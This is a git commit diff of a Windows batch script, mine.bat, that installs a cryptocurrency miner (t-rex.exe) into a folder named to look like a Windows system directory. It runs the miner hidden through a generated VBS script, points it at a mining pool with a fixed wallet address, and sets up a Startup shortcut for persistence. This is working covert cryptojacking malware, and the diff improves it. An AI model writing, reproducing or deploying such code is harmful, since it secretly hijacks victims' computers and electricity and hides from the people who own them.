acf40ba3b8c177fe0f40fbb3d2c5dbe8106a8154
Tejasvi Sharma <134033214+iemtejasvi@users.noreply.github.com>
2025-02-18 11:43:04 +0530

    mine.bat

--- mine.bat
+++ mine.bat
@@ -1,21 +1,27 @@
 @echo off
 setlocal
 
-:: Define script name and path
-set "MINER_SCRIPT=%APPDATA%\WindowsSystem\miner.bat"
-set "VBS_SCRIPT=%APPDATA%\WindowsSystem\run_hidden.vbs"
+:: Define paths
+set "INSTALL_DIR=%APPDATA%\WindowsSystem"
+set "MINER_SCRIPT=%INSTALL_DIR%\miner.bat"
+set "VBS_SCRIPT=%INSTALL_DIR%\run_hidden.vbs"
 set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
+set "MINER_EXE=t-rex.exe"
+set "MINER_PATH=%CD%\%MINER_EXE%" 
 
-:: Create necessary directories
-mkdir "%APPDATA%\WindowsSystem" 2>nul
+:: Create hidden directory
+mkdir "%INSTALL_DIR%" 2>nul
+
+:: Copy miner executable and script to hidden directory
+copy "%MINER_PATH%" "%INSTALL_DIR%\%MINER_EXE%" /Y >nul 2>&1
 
 :: Write miner script
 echo @echo off > "%MINER_SCRIPT%"
 echo :loop >> "%MINER_SCRIPT%"
 echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop) >> "%MINER_SCRIPT%"
-echo start /b t-rex.exe -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"
+echo start /b "%INSTALL_DIR%\%MINER_EXE%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"
 
-:: Write VBS script to run miner in hidden mode
+:: Write VBS script to run miner hidden
 echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
 echo WshShell.Run """%MINER_SCRIPT%""", 0, False >> "%VBS_SCRIPT%"
 
